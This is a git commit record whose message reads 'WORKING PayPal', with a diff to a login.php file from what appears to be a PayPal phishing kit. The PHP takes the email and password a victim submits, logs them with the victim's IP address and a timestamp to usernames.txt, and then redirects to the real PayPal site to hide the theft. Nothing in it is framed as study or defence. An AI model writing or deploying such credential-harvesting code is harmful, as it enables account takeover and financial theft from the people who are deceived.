6e9836ab083b63c6b216ec7fd8c5faba20416f27
MicrowaveOvenfrom2028 <Ghostcashh2077@proton.me>
2025-11-14 15:45:03 -0800

    WORKING PayPal

--- login.php
+++ login.php
@@ -1,6 +1,11 @@
 <?php
+$email = $_POST['email'];
+$pass = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$time = date('Y-m-d H:i:s');
 
-file_put_contents("usernames.txt", "Paypal Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
-header('Location: https://www.paypal.com/authflow/password-recovery/');
+file_put_contents('usernames.txt', "[$time] IP: $ip | Email: $email | Pass: $pass\n", FILE_APPEND);
+
+header("Location: https://www.paypal.com");
 exit();
 ?>
